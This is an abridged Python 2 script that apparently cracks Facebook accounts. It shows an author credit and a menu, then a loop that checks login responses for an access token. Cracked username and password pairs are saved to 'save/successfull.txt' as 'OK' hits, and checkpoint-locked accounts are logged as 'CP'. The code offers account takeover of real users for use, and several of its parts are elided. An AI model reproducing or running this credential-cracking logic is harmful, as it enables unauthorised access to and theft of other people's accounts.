...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : NAYIM ISLAM'
    print 'FACEBOOK : Nayim Islam '
    print 'GITHUB     : github.com/MrNayum12'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[NAYIM -OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[NAYIM -CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
    ...
    print
    print
    '[\xe2\x9c\x93] NAYIM  OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
